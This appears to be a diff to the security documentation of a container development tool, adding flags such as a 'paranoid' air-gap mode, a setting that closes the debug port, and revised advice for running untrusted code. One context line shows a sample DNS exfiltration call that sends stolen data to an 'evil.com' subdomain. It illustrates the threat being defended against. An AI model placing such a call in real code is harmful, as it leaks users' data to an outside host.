@@ -311,6 +311,16 @@ dns.lookup(`${stolen}.evil.com`, () => {});  // Data exfiltrated via DNS
 
 ## Security Configuration Reference
 
+### CLI Flags
+
+| Flag | Description |
+|------|-------------|
+| `--paranoid` | Maximum security: air-gap after setup, disable debug port, stricter limits |
+| `--offline` | Start with no network access immediately |
+| `--no-debug-port` | Disable debug port exposure (9229) |
+
+### Configuration File
+
 ```yaml
 # devkit.yaml - Security settings
 
@@ -335,6 +345,9 @@ security:
 
   # Prevent privilege escalation via setuid binaries
   no_new_privileges: true
+
+  # Disable debug port exposure (e.g., Node.js 9229)
+  disable_debug_port: false
 
 features:
   # Allow mounting host directories (breaks filesystem isolation)
@@ -362,24 +375,48 @@ features:
 ## Recommendations by Threat Level
 
 ### Standard Development (Trusted Code)
-```yaml
-security:
-  network_mode: restricted
+```bash
+devkit start
 ```
-Suitable for your own code and well-known dependencies.
+Uses default settings: network restricted (localhost blocked), all other hardening enabled.
 
 ### Evaluating Third-Party Code
-```yaml
-security:
-  network_mode: none  # After initial git clone and npm install
+```bash
+devkit start --paranoid
 ```
-Run `devkit start`, let it clone and install, then restart with network disabled.
+**Paranoid mode** automatically:
+1. Starts with network enabled for git clone and npm install
+2. Commits container state (preserves installed dependencies)
+3. Recreates container with `network_mode: none` (air-gapped)
+4. Disables debug port (prevents local RCE vector)
+5. Applies stricter resource limits (2GB RAM, 256 PIDs)
 
-### Running Untrusted Code
-1. Use a dedicated VM
-2. Snapshot before running
-3. Use `network_mode: none`
-4. Destroy VM after evaluation
+After setup, the container has **zero network access** - no data can be exfiltrated.
+
+### Manual Air-Gap Mode
+```bash
+devkit start --offline
+```
+Starts immediately with no network. Use when dependencies are already cached or you want to work on previously cloned code.
+
+### Disable Debug Port Only
+```bash
+devkit start --no-debug-port
+```
+Normal network access but debug port (9229) is not exposed.
+
+### Running Untrusted Code (Maximum Security)
+1. Use `--paranoid` mode as baseline
+2. Consider running devkit inside a dedicated VM for hardware isolation
+3. Snapshot VM before running untrusted code
+4. Destroy container and VM after evaluation
+
+```bash
+# Inside a disposable VM:
+devkit start --paranoid
+# ... evaluate code ...
+devkit stop --remove
+```
 
 ---
 
